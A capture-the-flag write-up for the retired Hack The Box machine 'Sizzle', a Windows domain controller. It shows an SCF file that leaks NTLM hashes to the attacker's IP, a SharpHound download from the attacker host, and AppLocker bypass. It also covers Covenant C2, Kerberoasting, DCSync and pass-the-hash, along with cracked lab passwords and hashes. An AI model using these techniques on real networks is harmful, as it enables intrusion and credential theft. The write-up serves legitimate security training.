# Sizzle

This is the write-up for the box Sizzle that got retired at the 1st June 2019.
My IP address was 10.10.14.22 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.103    sizzle.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/sizzle.nmap 10.10.10.103
```

```markdown
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:36+00:00; +1s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-10-12T17:21:35+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:35+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:36+00:00; +1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:35+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/12%Time=5DA20AF2%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Full TCP port scan finds additional ports:
```markdown
PORT      STATE SERVICE
(...)
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
```

## Checking FTP (Port 21)

Anonymous login is allowed but we see nothing in there and we can't upload anything.

## Checking HTTP (Port 80)

The web page shows a GIF of sizzling bacon and nothing more valuable on here.

## Checking DNS (Port 53)

Nslookup does not give us any information about other servers but on the Nmap scan we see the domains **HTB.LOCAL** and **sizzle.htb.local** that we should check.
Scanning for the domain **HTB.LOCAL** does give us an IPv6 address and scanning for **sizzle.htb.local** gives us the exact same thing, which means this box is the domain controller for this domain:
```markdown
> server 10.10.10.103
Default server: 10.10.10.103
Address: 10.10.10.103#53
> sizzle.htb.local
Server:         10.10.10.103
Address:        10.10.10.103#53

Name:   sizzle.htb.local
Address: 10.10.10.103
Name:   sizzle.htb.local
Address: dead:beef::68ff:77d6:ed8d:ba49
```

Let's put these domain names into our hosts file.

## Checking HTTPS (Port 443)

On this web page we see the same as on port 80 but we can analyze the SSL certificate:
- Common Name (CN): HTB-SIZZLE-CA
  - There is a **Certificate Authority** configured
  - Created on 3rd July 2018

A directory search with _Gobuster_ doesn't find anything valuable.

## Checking LDAP (Port 389)

We will enumerate LDAP with _ldapsearch_:
```markdown
ldapsearch -x -h sizzle.htb.local -s base namingcontexts
```

The output gives us the naming contexts and they are from Active Directory:
```markdown
dn:
namingContexts: DC=HTB,DC=LOCAL
namingContexts: CN=Configuration,DC=HTB,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=HTB,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=HTB,DC=LOCAL
```

Lets see if we can dump anything out of the domain:
```markdown
ldapsearch -x -h sizzle.htb.local -s sub -b 'DC=HTB,DC=LOCAL'
```

It tells us that we can't perform this action because we need to authenticate and can't do anything:
```markdown
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
```

## Checking SMB (Port 445)

SMB enumeration:
```markdown
smbmap -H 10.10.10.103 -u null
smbclient -N -L //10.10.10.103
```

Combining the output of the two commands we can see the permissions and comments on the shares:

```markdown
Disk                         Permissions            Comment
----                         -----------            -------
ADMIN$                       NO ACCESS              Remote Admin
C$                           NO ACCESS              Default Share
CertEnroll                   NO ACCESS              Active Directory Certificate Services Share
Department Shares            READ ONLY              -
IPC$                         READ ONLY              Remote IPC
NETLOGON                     NO ACCESS              Logon server share
Operations                   NO ACCESS              -
SYSVOL                       NO ACCESS              Logon server share
```

The only share we can read is _Department Shares_ so lets see what we find there:
```markdown
smbclient -N '//10.10.10.103/Department Shares'
```

![Folders in the share](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_smb-shares.png)

There are many folders of different departments so I will mount this share locally for easy browsing:
```markdown
mount -t cifs -o vers=1.0 '//10.10.10.103/Department Shares' /mnt/smb
```

Then we search for all files:
```markdown
find . -ls | tee ~/root/Documents/htb/boxes/sizzle/smbrecon.txt
```

The most files are found in the folder **/ZZ_ARCHIVE**. Reviewing these files shows that all of them are filled with NULL bytes and useless.

We can enumarate the **Access Control List** permissions with a tool called **smbcacls** for every folder:
```markdown
smbcacls -N '//10.10.10.103/Department Shares' /Users
```
```markdown
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/0x0/READ
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
```

In the case of the folder _Users_ the owner is the local Administrators group and everyone is allowed to read it.
Lets look for all of them with a loop:
```markdown
for i in $(ls); smbcacls -N '//10.10.10.103/Department Shares' $i; done
```

After this finishes it is interesting to see that we can write to all folders in _User_ and most importantly to the user _Public_.

### SCF File Attack

By doing a [SCF (Shell Command Files) File Attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) we can create an alias for an icon that shows to our IP address and when Windows Explorer opens that directory, tries to pull the icon and attempts to authenticate, we will take the hash of that authentication.

The file I created is called _steal.scf_ and has this contents:
```markdown
[Shell]
Command=2
IconFile=\\10.10.14.22\share\stealhash.ico
[Taskbar]
Command=ToggleDesktop
```

Start **Responder** and then upload that file to **C:\Users\Public**:
```markdown
responder -I tun0
```

After waiting for a while we get a response back from the user _amanda_ and her hash:
```markdown
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:b2b4d4963b3d164a:89D8272C0215903365A2CF72327C5F6A:0101000000000000C0653150DE09D2014CB331DE3128B7C2000000000200080053004D004200330001001E00570049004E002D00500052004
800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C0005001400
53004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000ADADF1C95E1BD9795395E1D1CC5818E9BFFAD50666BD7762FDC1BACAFA5E37EB0A00100000000000000
00000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003600000000000000000000000000
```

Cracking the hash with **hashcat**
```markdown
hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
```

The cracked password is:
> Ashare1972

### Checking SMB with authentication

Lets see if we have more access on the SMB shares:
```markdown
smbmap -u amanda -d htb.local -p 'Ashare1972' -H 10.10.10.103
```
```markdown
Disk                           Permissions
----                           -----------
ADMIN$                         NO ACCESS
C$                             NO ACCESS
CertEnroll                     READ ONLY
Department Shares              READ ONLY
IPC$                           READ ONLY
NETLOGON                       READ ONLY
Operations                     NO ACCESS
SYSVOL                         READ ONLY
```

Now we additionally have read access on _CertEnroll_, _NETLOGON_ and _SYSVOL_.

## Checking LDAP with authentication

Lets get some information from LDAP with the user authentication:
```markdown
ldapsearch -x -h sizzle.htb.local -D 'amanda@HTB.local' -w 'Ashare1972' -b 'DC=HTB,DC=LOCAL'
```

Now it is dumping a lot of information from the base and with a LDAP query we can look for users in the _Domain Admins_ group:
```markdown
ldapsearch -x -h sizzle.htb.local -D 'amanda@HTB.local' -w 'Ashare1972' -b 'DC=HTB,DC=LOCAL' "(&(ObjectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"
```

There are two users in this group:
- CN=Administrator,CN=Users,DC=HTB,DC=LOCAL
- CN=sizzler,CN=Users,DC=HTB,DC=LOCAL

## Checking the Certificate Authority on HTTP

The default path for Certificate Authorities on webservers is **/certsrv** which gives us an 401 (Not Authorized) status code normally.
But now we can authenticate with the user _amanda_ and see the **Microsoft Active Directory Certificate Services** in which we can request certificates.

The certificate is needed for certificate authentication because the box does not allow password authentication to use the other services.

```markdown
# Generate key:
openssl genrsa -aes256 -out amanda.key 2048

# Generate certificate signing request:
openssl req -new -key amanda.key -out amanda.csr
```

Now we copy the contents of _amanda.csr_ and let it sign from the CA:

![Request a certificate](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_1.png)

![Advanced certificate request](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_2.png)

![Paste contents of CSR](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_3.png)

![Download certificate as Base64-decoded file](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_4.png)

We now have a certificate that is signed by the CA using the _amanda_ user. Verifying this:
```markdown
openssl x509 -in amanda.cer -text
```
```markdown
Certificate:                                                                                         
    Data:                                                                                                                                                                                                  
        Version: 3 (0x2)                                                                             
        Serial Number:                                                                               
            69:00:00:00:16:88:87:cc:5f:6c:1a:a4:ba:00:00:00:00:00:16                                 
        Signature Algorithm: sha256WithRSAEncryption                                                 
        Issuer: DC = LOCAL, DC = HTB, CN = HTB-SIZZLE-CA        
        Validity                                                                                     
            Not Before: Oct 12 20:24:02 2019 GMT                                                     
            Not After : Oct 11 20:24:02 2020 GMT                                                     
        Subject: DC = LOCAL, DC = HTB, CN = Users, CN = amanda                                       
        Subject Public Key Info:
        (...)
```

### Using Windows Powershell Remoting (Port 5985)

As the full TCP port scan showed the ports 5985 and 5986 are open we will use these services for **Windows Powershell Remoting**.
We will use a modified version of this [WinRM Ruby script](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) that allows us to start a shell on the box. 

The modified script can be found in this folder with the name _psremote.rb_ in which the authentication method will be with the certificate that we created before.

```markdown
ruby psremote.rb
```

Running the script gives us a shell on the box as user _htb\amanda_!

## Information Gathering on the domain

Since we know that this is a domain controller and we have a session now, we should run **Bloodhound** to gather information about the domain. First we need to upload the ingestor **SharpHound.exe** onto the box and then we can execute it:

```markdown
IWR -Uri http://10.10.14.22/SharpHound.exe -OutFile SharpHound.exe
```

When trying to run it we see that a policy is blocking it so we need to [bypass AppLocker](https://github.com/api0cradle/UltimateAppLockerByPassList) by executing it in a directory that is whitelisted by default like _C:\Windows\Temp_ for example.

```markdown
.\SharpHound.exe
```

This creates a ZIP file that we need on our machine to analyze it with Bloodhound but it does not execute like it should, so we execute it with a C2 Framework.

### Starting a C2 Framework

As we will need to communicate a lot with the box we will load up the C2 Framework **Covenant**.

Installing it with Docker:
```markdown
docker build -t covenant .

docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $(pwd)/Data:/app/Data covenant --username tester
```

After that we get a web server on localhost on port 7443 thats our C2 framework.

This is the Covenant Dashboard:

![Covenant Dashboard](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-dashboard.png)

Starting a Listener:

![Covenant create Listener](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-listener.png)

Generating a Binary Launcher:

![Covenant start Launcher](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-launcher.png)

After executing that launcher.exe we get a callback and this can be seen on Grunts:

![Covenant start Grunt](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt.png)

Clicking on the Grunt name and then Interact:

![Covenant interacting with Grunt](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt-2.png)

With the command _help_ we can see every module we can execute like **Seatbelt, Rubeus, Mimikatz, Kerberoast** and much more.

But we want to start the SharpHound.exe with the parameters `--CollectionMethod all,GPOLocalGroup,LoggedOn`:

![Covenant executing SharpHound](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt-3.png)

And now we can download the generated ZIP file and analyze it with BloodHound.

### Analyzing BloodHound

Looking at the query **Find Principals with DCSync Rights** we get information about the users that can do a **DCSync Attack**.

The user _Mrlky_ has the _GetChangesAll_ and _GetChanges_ permission and these two are needed to do DS-Replication-Get-Changes to perform a DCSync attack:

![Bloodhound DCSync rights](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_bh_1.png)

If we look at the **Shortest Paths from Kerberoastable Users** we see that the user _Mrlky_ can do this, too:

![Bloodhound Kerberoastable rights](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_bh_2.png)


## Kerberoast and DCSync Attack

So lets do a **Kerberoast** attack from Covenant. First we create a token so the authentication works and then the module to Rubeus Kerberoast:

![Covenant MakeToken](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-maketoken.png)

![Covenant Rubeus Kerberoast](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-kerberoast.png)

And we get a TGS ticket for the user _Mrlky_:
```markdown
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$00EEDBE52D6CEFE97F3C75A89F3CAB73$779AF 6953FFC7F37CCE7A7247DDE3039336F59C99D8C763A4C1B1DA1D3AFFE71DC6CBF90171C811C58280 DA2CF72B54F293CE846E1EE2AF120B16A0BBBDD25F2D4A2781D9C97AF071F9FDFFA07DA2D48908D7 89CBCF5C883765347EAE76C09BB576B138C08DEBBFCBFAB84D1E8D4C5E68DE6C69EF41894F170B2F 095C664339655C34FE2C1487884602137974A0E239412504D5A4FC6217D0DE247422AD3AA6719A12 BABD90CA963807DBF6C797ABBBC1C3028085EAA0D2D66E0F1261079D8FAA873513108485CA66C5D0 CAA247E57FBCA400D97FCE6CF86C78C719EA639D8A81EFC1ED31CEF083B49EB9E1F6A48FC61A0B4C 1586A4E657F31D0061BA44F166173DBDDF01A7411CC61AF8025153EE6D5D348A9E0DA746F3827C9B 8C1E7A1FD328834EE794C31F0B8072E69F75A958B3B323632773C2B6B6FAA529D2909B4648018139 14C06F42B71626E55A01FA5376B1B3CF4E2C828285B582D9A568D340B8436610F0D4D3C6F9D42F25 DDBBA4D6E21729C87427D2DFB4F9AB31E68ED1947A01F4CE19C7C4659E39EA6301B67399EE76E785 322DFB7025DCE49F2B9CFEBC5D881A357030656F07E37B26628369293A9AB7BA3B9F4BA7BCB612D1 83FD4D98EACC32220AB2DADB665272BE52CD6BE56E302BA1888A7A9761DFE82BE40ED05B87966820 5E0F2A6CBB3C9B38A3E053715EB09F4111A01BA81105E51A0D782FB700013BDAB704C3136FD22C91 BBE6CAD72A8D0B29E5D7F4724303D0EECD311BE8C43DC97D7FC46D18410676807FF5F66419118119 2592AE0ACE56ABDBCAAADC109240FC5F09CB485C238FE0B80539CFA19D45127EE3759D8962BE93A9 169904A28212AFBFA61C0AB542468A9141BDDD801EC1673C43288755BB5B7E099C756E22DB884B82 96AB163EF076CD32C3F34C7BED21DD48DE33E717EFAB0DC1AACFD8B1A781148656DF7177EC480F3E 08D1D17E0DAC1F802867288149B385BF6B04BA5202280143233D339B12599A9E2A4CF94D194CBF38 7BB7362C0D080806B2F4455C287C8041B72DFBB70A477014F03A6C56A63981E2A391C5FB3AB030DE 27C968D92AE8871789CD8CBD88A1D32C96976A5EDB16D7F5D4070AE2BA4ED335398AACFEA7D0C104 C6681CFAB943665A4B48AB6813E636347FA13EAB81D774605D5F5F6C05BBDDAC3604DEC967A9E9BB F80C8F3BA45462DA0395144DB20ABD98627F4436B6531EA3ECAA0ADC16AB4D8132FB773627A3EE6C DAAFD240C466F341F45046A6CFE0C5F274D5667496913EDA352652C802DF55B032957B97D35D8754 CA2B8A27BA498D0189F4199DD6E9DB7D9B1AAA76283966D8968F034952F98C499BB5EFED0808F6D3 4D84231C92078E0E8FCA3DD26D5381B86475944B7A4C64B8DEBDD6B8401F223 
```

Cracking it with Hashcat:
```markdown
hashcat -m 13100 mrlky.tgs /usr/share/wordlists/rockyou.txt
```

We have the password of Mrlky:
> Football#7

Now we do the DCSync attack with this user. First we create a token in Covenant for authentication and then the DCSync module on the user _Administrator_:

![Covenant MakeToken 2](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-maketoken-2.png)

![Covenant DCSync](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-dcsync.png)

The NTLM hash of Administrator is:
> f6b7160bfc91823792e0ac3a162c9267

With that we can log in with _impacket-wmiexec_ from the **Impacket framework** into the box:
```markdown
impacket-wmiexec psexec.py Administrator@10.10.10.103 -hashes f6b7160bfc91823792e0ac3a162c9267:f6b7160bfc91823792e0ac3a162c9267
```

This starts a shell on the box as the user Administrator on the box and we can read the flags!
